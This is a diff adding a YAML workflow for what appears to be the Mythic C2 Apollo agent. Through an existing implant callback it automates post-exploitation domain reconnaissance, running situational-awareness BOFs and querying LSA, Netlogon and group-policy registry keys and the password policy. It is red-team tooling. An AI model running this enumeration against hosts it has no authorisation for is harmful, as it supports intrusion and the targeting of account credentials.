@@ -1,0 +1,137 @@
+name: "Domain Environment Assessment - Apollo"
+description: "Passive domain environment assessment"
+trigger: manual
+trigger_data:
+  payload_types:
+    - apollo
+keywords:
+  - apollo_callback
+environment: {}
+
+# uses: https://github.com/trustedsec/CS-Situational-Awareness-BOF, and listwamaccounts BOF from: https://github.com/Tw1sm/list-wam-accounts
+
+
+steps:
+  - name: "Current Domain Context"
+    continue_on_error: true
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      params: '{
+        "coff_name": "whoami.x64.o",
+        "function": "go",
+        "serialized_arguments": "00000000"
+      }'
+      command_name: execute_coff
+      
+  - name: "DomainInfo"
+    continue_on_error: true
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    depends_on:
+      - Current Domain Context    
+    action_data:
+      callback_display_id: CALLBACK_ID
+      params: '{
+        "coff_name": "Domaininfo.x64.o",
+        "function": "go",
+        "serialized_arguments": "00000000"
+      }'
+      command_name: execute_coff
+      
+  - name: "Domain Configuration Registry"
+    continue_on_error: true
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    depends_on:
+      - DomainInfo
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: reg_query
+      params: '{"hive": "HKLM", "key": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"}'
+      
+  - name: "Check Network Logon Registry"
+    continue_on_error: true
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    depends_on:
+      - Domain Configuration Registry
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: reg_query
+      params: '{"hive": "HKLM", "key": "SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0"}'
+      
+  - name: "Check Domain Join Information"
+    continue_on_error: true
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    depends_on:
+      - Check Network Logon Registry
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: reg_query
+      params: '{"hive": "HKLM", "key": "SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters"}'
+      
+  - name: "Check DNS Configuration"
+    continue_on_error: true
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    depends_on:
+      - Check Domain Join Information
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: reg_query
+      params: '{"hive": "HKLM", "key": "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters"}'
+      
+  - name: "Password Policy"
+    continue_on_error: true
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    depends_on:
+      - Check DNS Configuration    
+    action_data:
+      callback_display_id: CALLBACK_ID
+      params: '{
+        "coff_name": "get_password_policy.x64.o",
+        "function_name": "go",
+        "coff_arguments": [["wchar", "localhost"]]
+      }'
+      command_name: execute_coff
+
+  - name: "AAD Join Info"
+    continue_on_error: true
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    depends_on:
+      - Password Policy    
+    action_data:
+      callback_display_id: CALLBACK_ID
+      params: '{
+        "coff_name": "aadjoininfo.x64.o",
+        "function_name": "go"
+      }'
+      command_name: execute_coff
+      
+  - name: "List WAM Accounts"
+    continue_on_error: true
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    depends_on:
+      - AAD Join Info    
+    action_data:
+      callback_display_id: CALLBACK_ID
+      params: '{
+        "coff_name": "listwamaccounts.x64.o",
+        "function_name": "go"
+      }'
+      command_name: execute_coff
